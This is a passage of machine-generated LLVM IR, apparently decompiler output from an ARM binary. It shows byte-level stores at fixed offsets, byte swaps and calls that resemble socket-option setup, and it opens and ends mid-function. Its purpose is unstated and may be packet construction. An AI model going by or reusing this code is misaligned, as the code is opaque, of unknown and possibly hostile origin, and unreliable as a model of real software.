  %v1_b510 = trunc i32 %v0_b510 to i8
  %v2_b510 = load i32, i32* @r5, align 4
  %v3_b510 = add i32 %v2_b510, 11
  %v4_b510 = inttoptr i32 %v3_b510 to i8*
  store i8 %v1_b510, i8* %v4_b510, align 1
  %v0_b514 = load i32, i32* @r5, align 4
  store i32 %v0_b514, i32* @r0, align 4
  %v2_b518 = call i32 @function_e424(i32 %v0_b514, i32 20)
  %v3_b518 = trunc i32 %v2_b518 to i8
  %v4_b51c = sdiv i32 %v2_b518, 256
  store i32 %v4_b51c, i32* %r3.global-to-local, align 4
  %v1_b520 = trunc i32 %v4_b51c to i8
  %v2_b520 = load i32, i32* @r5, align 4
  %v3_b520 = add i32 %v2_b520, 11
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 %v1_b520, i8* %v4_b520, align 1
  %v3_b524 = load i32, i32* @r5, align 4
  %v4_b524 = add i32 %v3_b524, 10
  %v5_b524 = inttoptr i32 %v4_b524 to i8*
  store i8 %v3_b518, i8* %v5_b524, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b52c = load i32, i32* @r8, align 4
  %v1_b52c = trunc i32 %v0_b52c to i8
  %v2_b52c = load i32, i32* @r6, align 4
  %v3_b52c = add i32 %v2_b52c, 10
  %v4_b52c = inttoptr i32 %v3_b52c to i8*
  store i8 %v1_b52c, i8* %v4_b52c, align 1
  %v0_b530 = load i32, i32* @r8, align 4
  %v1_b530 = trunc i32 %v0_b530 to i8
  %v2_b530 = load i32, i32* @r6, align 4
  %v3_b530 = add i32 %v2_b530, 11
  %v4_b530 = inttoptr i32 %v3_b530 to i8*
  store i8 %v1_b530, i8* %v4_b530, align 1
  %v0_b534 = load i32, i32* @r6, align 4
  store i32 %v0_b534, i32* @r0, align 4
  %v2_b538 = call i32 @function_e424(i32 %v0_b534, i32 20)
  %v3_b538 = trunc i32 %v2_b538 to i8
  store i32 %v2_b538, i32* %r0.global-to-local, align 4
  %v4_b53c = sdiv i32 %v2_b538, 256
  store i32 %v4_b53c, i32* %r3.global-to-local, align 4
  %v3_b540 = load i32, i32* @r6, align 4
  %v4_b540 = add i32 %v3_b540, 10
  %v5_b540 = inttoptr i32 %v4_b540 to i8*
  store i8 %v3_b538, i8* %v5_b540, align 1
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* @r6, align 4
  %v3_b544 = add i32 %v2_b544, 11
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* @r7, align 4
  %v1_b548 = add i32 %v0_b548, 4
  %v2_b548 = inttoptr i32 %v1_b548 to i8*
  %v3_b548 = load i8, i8* %v2_b548, align 1
  %v4_b548 = zext i8 %v3_b548 to i32
  store i32 %v4_b548, i32* %r3.global-to-local, align 4
  %v1_b54c = add i32 %v0_b548, 5
  %v2_b54c = inttoptr i32 %v1_b54c to i8*
  %v3_b54c = load i8, i8* %v2_b54c, align 1
  %v4_b54c = zext i8 %v3_b54c to i32
  store i32 %v0_b548, i32* @r1, align 4
  %v4_b554 = mul nuw nsw i32 %v4_b54c, 256
  %v5_b554 = or i32 %v4_b554, %v4_b548
  store i32 %v5_b554, i32* %r2.global-to-local, align 4
  %v0_b558 = load i32, i32* @r8, align 4
  %v1_b558 = trunc i32 %v0_b558 to i8
  %v3_b558 = add i32 %v0_b548, 6
  %v4_b558 = inttoptr i32 %v3_b558 to i8*
  store i8 %v1_b558, i8* %v4_b558, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_b560 = load i32, i32* @r8, align 4
  %v1_b560 = trunc i32 %v0_b560 to i8
  %v2_b560 = load i32, i32* @r7, align 4
  %v3_b560 = add i32 %v2_b560, 7
  %v4_b560 = inttoptr i32 %v3_b560 to i8*
  store i8 %v1_b560, i8* %v4_b560, align 1
  %v0_b564 = load i32, i32* @r6, align 4
  store i32 %v0_b564, i32* %r0.global-to-local, align 4
  %v4_b568 = call i32 @function_e480(i32 %v0_b564, i32 %v0_b548, i32 %v5_b554, i32 %stack_var_-152.0.ph)
  %v5_b568 = trunc i32 %v4_b568 to i8
  store i32 %v4_b568, i32* %r0.global-to-local, align 4
  %v3_b56c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b56c, i32* %r3.global-to-local, align 4
  %v3_b570 = mul i32 %v3_b56c, 32
  store i32 %v3_b570, i32* %r2.global-to-local, align 4
  %v0_b574 = load i32, i32* @r5, align 4
  %v1_b574 = add i32 %v0_b574, 16
  %v2_b574 = inttoptr i32 %v1_b574 to i32*
  %v3_b574 = load i32, i32* %v2_b574, align 4
  store i32 %v3_b574, i32* %r1.global-to-local, align 4
  %v5_b578 = mul i32 %v3_b56c, 24
  store i32 %v5_b578, i32* %r2.global-to-local, align 4
  %v4_b57c42 = udiv i32 %v4_b568, 256
  %v1_b580 = trunc i32 %v4_b57c42 to i8
  %v2_b580 = load i32, i32* @r7, align 4
  %v3_b580 = add i32 %v2_b580, 7
  %v4_b580 = inttoptr i32 %v3_b580 to i8*
  store i8 %v1_b580, i8* %v4_b580, align 1
  %v0_b584 = load i32, i32* %r2.global-to-local, align 4
  %v1_b584 = load i32, i32* @sb, align 4
  %v2_b584 = add i32 %v1_b584, %v0_b584
  store i32 %v2_b584, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b58c = load i32, i32* @r7, align 4
  %v4_b58c = add i32 %v3_b58c, 6
  %v5_b58c = inttoptr i32 %v4_b58c to i8*
  store i8 %v5_b568, i8* %v5_b58c, align 1
  %v0_b590 = load i32, i32* %r1.global-to-local, align 4
  %v1_b590 = load i32, i32* %lr.global-to-local, align 4
  %v2_b590 = add i32 %v1_b590, 4
  %v3_b590 = inttoptr i32 %v2_b590 to i32*
  store i32 %v0_b590, i32* %v3_b590, align 4
  %v0_b594 = load i32, i32* %r3.global-to-local, align 4
  %v1_b594 = trunc i32 %v0_b594 to i8
  %v2_b594 = load i32, i32* %r2.global-to-local, align 4
  %v3_b594 = load i32, i32* @sb, align 4
  %v4_b594 = add i32 %v3_b594, %v2_b594
  %v5_b594 = inttoptr i32 %v4_b594 to i8*
  store i8 %v1_b594, i8* %v5_b594, align 1
  %v0_b598 = load i32, i32* @r8, align 4
  %v1_b598 = trunc i32 %v0_b598 to i8
  %v2_b598 = load i32, i32* %lr.global-to-local, align 4
  %v3_b598 = add i32 %v2_b598, 2
  %v4_b598 = inttoptr i32 %v3_b598 to i8*
  store i8 %v1_b598, i8* %v4_b598, align 1
  %v0_b59c = load i32, i32* @r8, align 4
  %v1_b59c = trunc i32 %v0_b59c to i8
  %v2_b59c = load i32, i32* %lr.global-to-local, align 4
  %v3_b59c = add i32 %v2_b59c, 1
  %v4_b59c = inttoptr i32 %v3_b59c to i8*
  store i8 %v1_b59c, i8* %v4_b59c, align 1
  %v0_b5a0 = load i32, i32* @r8, align 4
  %v1_b5a0 = trunc i32 %v0_b5a0 to i8
  %v2_b5a0 = load i32, i32* %lr.global-to-local, align 4
  %v3_b5a0 = add i32 %v2_b5a0, 3
  %v4_b5a0 = inttoptr i32 %v3_b5a0 to i8*
  store i8 %v1_b5a0, i8* %v4_b5a0, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r1.global-to-local, align 4
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_b5b8 = load i32, i32* %lr.global-to-local, align 4
  %v6_b5c0 = inttoptr i32 %v0_b5ac to i32*
  %v7_b5c0 = call i32 @function_1372c(i32 %v3_b160, i32* %v6_b5c0, i32 %stack_var_-120.0.ph, i32 16384, i32 %v0_b5b8, i32 16)
  %v3_b5c4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b5c4, i32* %r3.global-to-local, align 4
  %v1_b5c8 = add i32 %v3_b5c4, 1
  store i32 %v1_b5c8, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @fp, align 4
  %v9_b5cc = icmp eq i32 %v1_b5c8, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b5c8, i32* %stack_var_-40, align 4
  %v6_b5d4 = icmp slt i32 %v1_b5c8, %v1_b5cc
  br i1 %v6_b5d4, label %dec_label_pc_b48c, label %dec_label_pc_b474

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b170
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v1_b5e0 = call i32 @function_12e9c(i32 %v3_b160)
  store i32 %v1_b5e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b00c, %dec_label_pc_b5dc
  %v29_b5e8 = phi i32 [ %v3_b160, %dec_label_pc_b00c ], [ %v1_b5e0, %dec_label_pc_b5dc ]
  store i32 %v3_b00c, i32* %r4.global-to-local, align 4
  store i32 %v15_b00c, i32* %r8.global-to-local, align 4
  ret i32 %v29_b5e8

dec_label_pc_b5ec:                                ; preds = %dec_label_pc_b48c
  %v1_b5ec = add i32 %v2_b494, 16
  %v2_b5ec = inttoptr i32 %v1_b5ec to i32*
  %v3_b5ec = load i32, i32* %v2_b5ec, align 4
  store i32 %v3_b5ec, i32* %r4.global-to-local, align 4
  %v0_b5f0 = call i32 @function_fe24()
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v3_b5f4 = load i32, i32* %stack_var_-40, align 4
  %v5_b5fc = mul i32 %v3_b5f4, 24
  %v0_b600 = load i32, i32* %r4.global-to-local, align 4
  %v1_b604 = load i32, i32* @sb, align 4
  %v2_b604 = add i32 %v1_b604, %v5_b5fc
  store i32 %v2_b604, i32* %r1.global-to-local, align 4
  %v1_b608 = and i32 %v0_b600, 65280
  store i32 %v1_b608, i32* %r3.global-to-local, align 4
  %v1_b600 = udiv i32 %v0_b600, 256
  %v3_b60c = and i32 %v1_b600, 65280
  store i32 %v3_b60c, i32* %r2.global-to-local, align 4
  %v1_b614 = add i32 %v2_b604, 20
  %v2_b614 = inttoptr i32 %v1_b614 to i8*
  %v3_b614 = load i8, i8* %v2_b614, align 1
  %v4_b614 = zext i8 %v3_b614 to i32
  store i32 %v4_b614, i32* %lr.global-to-local, align 4
  %v2_b620 = call i32 @llvm.bswap.i32(i32 %v0_b600)
  %v7_b624 = lshr i32 %v0_b5f0, %v4_b614
  %v8_b624 = add i32 %v7_b624, %v2_b620
  %v3_b630 = mul i32 %v8_b624, 16777216
  %v1_b634 = and i32 %v8_b624, 65280
  store i32 %v1_b634, i32* %r0.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v4_b640 = mul nuw nsw i32 %v1_b634, 256
  %v5_b640 = or i32 %v4_b640, %v3_b630
  store i32 %v5_b640, i32* %r1.global-to-local, align 4
  %v2_b644 = call i32 @llvm.bswap.i32(i32 %v8_b624)
  store i32 %v2_b644, i32* %r3.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  %v1_b64c = load i32, i32* @r5, align 4
  %v2_b64c = add i32 %v1_b64c, 16
  %v3_b64c = inttoptr i32 %v2_b64c to i32*
  store i32 %v2_b644, i32* %v3_b64c, align 4
  br i1 %v2_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b654:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  %v0_b654 = call i32 @function_fe24()
  store i32 %v0_b654, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  %v0_b660 = load i32, i32* @sl, align 4
  %v9_b660 = icmp eq i32 %v0_b660, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  store i1 %v9_b660, i1* %cpsr_z.global-to-local, align 1
  %v1_b664 = load i32, i32* @r5, align 4
  %v2_b664 = add i32 %v1_b664, 12
  %v3_b664 = inttoptr i32 %v2_b664 to i32*
  store i32 %v0_b654, i32* %v3_b664, align 4
  br i1 %v9_b660, label %dec_label_pc_b66c, label %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge

dec_label_pc_b654.dec_label_pc_b4d0_crit_edge:    ; preds = %dec_label_pc_b654
  %v1_b4d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4d0

dec_label_pc_b66c:                                ; preds = %dec_label_pc_b654, %dec_label_pc_b4c0
  %v0_b66c = call i32 @function_fe24()
  %v3_b674 = urem i32 %v0_b66c, 65536
  store i32 %v3_b674, i32* %r0.global-to-local, align 4
  %v3_b67815 = udiv i32 %v0_b66c, 256
  %v1_b67c = trunc i32 %v3_b67815 to i8
  %v2_b67c = load i32, i32* @r5, align 4
  %v3_b67c = add i32 %v2_b67c, 5
  %v4_b67c = inttoptr i32 %v3_b67c to i8*
  store i8 %v1_b67c, i8* %v4_b67c, align 1
  %v0_b680 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v1_b688 = sub i32 999, %v0_b680
  store i32 %v1_b688, i32* %r2.global-to-local, align 4
  %v3_b68c = sdiv i32 %v1_b688, 256
  store i32 %v3_b68c, i32* %r1.global-to-local, align 4
  %v1_b690 = load i32, i32* @r4, align 4
  %v9_b690 = icmp eq i32 %v3_b1b4, %v1_b690
  store i1 %v9_b690, i1* %cpsr_z.global-to-local, align 1
  %v1_b694 = trunc i32 %v0_b680 to i8
  %v2_b694 = load i32, i32* @r5, align 4
  %v3_b694 = add i32 %v2_b694, 4
  %v4_b694 = inttoptr i32 %v3_b694 to i8*
  store i8 %v1_b694, i8* %v4_b694, align 1
  %v0_b698 = load i32, i32* %r1.global-to-local, align 4
  %v1_b698 = trunc i32 %v0_b698 to i8
  %v2_b698 = load i32, i32* @r6, align 4
  %v3_b698 = add i32 %v2_b698, 5
  %v4_b698 = inttoptr i32 %v3_b698 to i8*
  store i8 %v1_b698, i8* %v4_b698, align 1
  %v0_b69c = load i32, i32* %r2.global-to-local, align 4
  %v1_b69c = trunc i32 %v0_b69c to i8
  %v2_b69c = load i32, i32* @r6, align 4
  %v3_b69c = add i32 %v2_b69c, 4
  %v4_b69c = inttoptr i32 %v3_b69c to i8*
  store i8 %v1_b69c, i8* %v4_b69c, align 1
  %v0_b6a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6a0, label %dec_label_pc_b6a4, label %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge

dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge:    ; preds = %dec_label_pc_b66c
  %v1_b4e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b4dc

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b66c, %dec_label_pc_b4d0
  %v0_b6a4 = call i32 @function_fe24()
  %v1_b6a4 = trunc i32 %v0_b6a4 to i8
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v4_b6ac = sdiv i32 %v0_b6a4, 256
  store i32 %v4_b6ac, i32* %r3.global-to-local, align 4
  %v1_b6b0 = load i32, i32* @r4, align 4
  %v9_b6b0 = icmp eq i32 %v3_b1b8, %v1_b6b0
  store i1 %v9_b6b0, i1* %cpsr_z.global-to-local, align 1
  %v3_b6b4 = load i32, i32* @r5, align 4
  %v4_b6b4 = add i32 %v3_b6b4, 44
  %v5_b6b4 = inttoptr i32 %v4_b6b4 to i8*
  store i8 %v1_b6a4, i8* %v5_b6b4, align 1
  %v0_b6b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6b8 = trunc i32 %v0_b6b8 to i8
  %v2_b6b8 = load i32, i32* @r7, align 4
  %v3_b6b8 = add i32 %v2_b6b8, 1
  %v4_b6b8 = inttoptr i32 %v3_b6b8 to i8*
  store i8 %v1_b6b8, i8* %v4_b6b8, align 1
  %v0_b6bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6bc, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  %v0_b6c0 = call i32 @function_fe24()
  %v1_b6c0 = trunc i32 %v0_b6c0 to i8
  store i32 %v0_b6c0, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  %v4_b6c8 = sdiv i32 %v0_b6c0, 256
  store i32 %v4_b6c8, i32* %r3.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6d0 = trunc i32 %v4_b6c8 to i8
  %v2_b6d0 = load i32, i32* @r7, align 4
  %v3_b6d0 = add i32 %v2_b6d0, 3
  %v4_b6d0 = inttoptr i32 %v3_b6d0 to i8*
  store i8 %v1_b6d0, i8* %v4_b6d0, align 1
  %v0_b6d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6d4, label %bb99, label %bb98

bb98:                                             ; preds = %dec_label_pc_b6c0
  %v1_b6d4 = load i32, i32* @r5, align 4
  %v2_b6d4 = add i32 %v1_b6d4, 16
  %v3_b6d4 = inttoptr i32 %v2_b6d4 to i32*
  %v4_b6d4 = load i32, i32* %v3_b6d4, align 4
  store i32 %v4_b6d4, i32* %r3.global-to-local, align 4
  br label %bb99

bb99:                                             ; preds = %dec_label_pc_b6c0, %bb98
  %v3_b6d8 = load i32, i32* @r7, align 4
  %v4_b6d8 = add i32 %v3_b6d8, 2
  %v5_b6d8 = inttoptr i32 %v4_b6d8 to i8*
  store i8 %v1_b6c0, i8* %v5_b6d8, align 1
  %v0_b6dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b6dc, label %dec_label_pc_b6e4, label %bb100

bb100:                                            ; preds = %bb99
  %v1_b6dc = load i32, i32* %r3.global-to-local, align 4
  %v2_b6dc = load i32, i32* @r6, align 4
  %v3_b6dc = add i32 %v2_b6dc, 16
  %v4_b6dc = inttoptr i32 %v3_b6dc to i32*
  store i32 %v1_b6dc, i32* %v4_b6dc, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b6e4:                                ; preds = %dec_label_pc_b4e8, %bb99
  %v0_b6e4 = call i32 @function_fe24()
  store i32 %v0_b6e4, i32* %r0.global-to-local, align 4
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  %v1_b6f0 = load i32, i32* @r6, align 4
  %v2_b6f0 = add i32 %v1_b6f0, 16
  %v3_b6f0 = inttoptr i32 %v2_b6f0 to i32*
  store i32 %v0_b6e4, i32* %v3_b6f0, align 4
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4
  %v0_b6f8 = load i32, i32* @r7, align 4
  %v1_b6f8 = add i32 %v0_b6f8, 8
  store i32 %v1_b6f8, i32* %r0.global-to-local, align 4
  store i32 %v5_b0f8, i32* @r1, align 4
  %v1_b700 = inttoptr i32 %v1_b6f8 to i8*
  %v2_b700 = call i32 @function_10000(i8* %v1_b700)
  store i32 %v2_b700, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b508

dec_label_pc_b708:                                ; preds = %dec_label_pc_b198
  %v1_b710 = add i32 %v5_b0f8, 8
  store i32 %v1_b710, i32* %r2.global-to-local, align 4
  %v1_b714 = add i32 %v5_b0f8, 52
  store i32 %v1_b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b474.preheader

; uselistorder directives
  uselistorder i32 %v1_b714, { 1, 0 }
  uselistorder i32 %v1_b710, { 1, 0 }
  uselistorder i32 %v4_b6c8, { 1, 0 }
  uselistorder i32 %v0_b6c0, { 0, 2, 1 }
  uselistorder i32 %v0_b6a4, { 0, 2, 1 }
  uselistorder i32 %v2_b644, { 1, 0 }
  uselistorder i32 %v8_b624, { 1, 2, 0 }
  uselistorder i32 %v0_b600, { 1, 0, 2 }
  uselistorder i32 %v1_b5cc, { 1, 2, 0 }
  uselistorder i32 %v1_b5c8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_b56c, { 1, 0, 2 }
  uselistorder i32 %v4_b568, { 0, 2, 1 }
  uselistorder i32 %v0_b548, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_b538, { 0, 2, 1 }
  uselistorder i32 %v4_b51c, { 1, 0 }
  uselistorder i32 %v7_b4a0, { 1, 0, 2 }
  uselistorder i32 %v0_b474, { 1, 0 }
  uselistorder i1 %v7_b4b8, { 2, 1, 0 }
  uselistorder i1 %v2_b6ec, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b434, { 1, 0, 2 }
  uselistorder i32 %v0_b3f8, { 1, 0, 2 }
  uselistorder i32 %v3_b2ac, { 0, 2, 1 }
  uselistorder i32 %v3_b26c, { 1, 0 }
  uselistorder i32 %tmp86, { 1, 0 }
  uselistorder i32 %v1_b224, { 1, 0 }
  uselistorder i32 %v1_b200, { 1, 0 }
  uselistorder i32 %v1_b1fc, { 0, 2, 1 }
  uselistorder i32 %v3_b1e0, { 2, 1, 0 }
  uselistorder i32 %v0_b1bc, { 1, 0, 2 }
  uselistorder i32 %v1_b1ac, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_b1a8, { 0, 2, 1 }
  uselistorder i32 %v0_b1a4, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_b190, { 1, 0 }
  uselistorder i1 %v7_b164, { 1, 0 }
  uselistorder i32 %v3_b160, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_b14c, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_b118, { 1, 0, 2 }
  uselistorder i32 %v5_b0f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_b09c, { 1, 0 }
  uselistorder i32 %v2_b02c, { 0, 3, 1, 2 }
  uselistorder i32 %v1_b010, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i32 1023, { 0, 1, 2, 4, 3, 5 }
  uselistorder i8 47, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_b6e4, { 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b508, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b474.preheader, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %.thread23, { 2, 1, 0 }
}

define i32 @function_b728(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b728:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp30 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v1_b72c = urem i32 %arg1, 256
  store i32 %v1_b72c, i32* @fp, align 4
  store i32 %v1_b72c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b744 = urem i32 %arg3, 256
  store i32 %v1_b744, i32* @r4, align 4
  %v2_b748 = call i32 @function_13a94(i32 %v1_b72c, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b754 = load i32, i32* @fp, align 4
  store i32 %v0_b754, i32* %r0.global-to-local, align 4
  %v2_b758 = call i32 @function_13a94(i32 %v0_b754, i32 4)
  %v0_b75c = load i32, i32* @r5, align 4
  store i32 %v0_b75c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b76c = load i32, i32* @r4, align 4
  store i32 %v0_b76c, i32* %r0.global-to-local, align 4
  %v5_b770 = inttoptr i32 %v0_b75c to i32*
  %v6_b770 = call i32 @function_a4e8(i32 %v0_b76c, i32* %v5_b770, i32 2, i32 0)
  %v1_b77c = urem i32 %v6_b770, 256
  store i32 %v1_b77c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b788 = load i32, i32* @r5, align 4
  store i32 %v0_b788, i32* %r1.global-to-local, align 4
  %v0_b78c = load i32, i32* @r4, align 4
  store i32 %v0_b78c, i32* %r0.global-to-local, align 4
  %v6_b794 = inttoptr i32 %v0_b788 to i32*
  %v7_b794 = call i32 @function_a4e8(i32 %v0_b78c, i32* %v6_b794, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_b798 = load i32, i32* @r5, align 4
  store i32 %v0_b798, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b794, i32* @r6, align 4
  %v0_b7a8 = load i32, i32* @r4, align 4
  store i32 %v0_b7a8, i32* %r0.global-to-local, align 4
  %v4_b7ac = inttoptr i32 %v0_b798 to i32*
  %v5_b7ac = call i32 @function_a4e8(i32 %v0_b7a8, i32* %v4_b7ac, i32 4, i32 64)
  %v1_b7b4 = urem i32 %v5_b7ac, 256
  store i32 %v1_b7b4, i32* %ip.global-to-local, align 4
  %v0_b7b8 = load i32, i32* @r5, align 4
  store i32 %v0_b7b8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b7c4 = load i32, i32* @r4, align 4
  store i32 %v0_b7c4, i32* %r0.global-to-local, align 4
  %v6_b7cc = inttoptr i32 %v0_b7b8 to i32*
  %v7_b7cc = call i32 @function_a4e8(i32 %v0_b7c4, i32* %v6_b7cc, i32 5, i32 1)
  %v1_b7d8 = urem i32 %v7_b7cc, 256
  store i32 %v1_b7d8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_b7e0 = load i32, i32* @r5, align 4
  store i32 %v0_b7e0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b7e8 = load i32, i32* @r4, align 4
  store i32 %v0_b7e8, i32* %r0.global-to-local, align 4
  %v5_b7f0 = inttoptr i32 %v0_b7e0 to i32*
  %v6_b7f0 = call i32 @function_a4e8(i32 %v0_b7e8, i32* %v5_b7f0, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_b7f4 = load i32, i32* @r5, align 4
  store i32 %v0_b7f4, i32* %r1.global-to-local, align 4
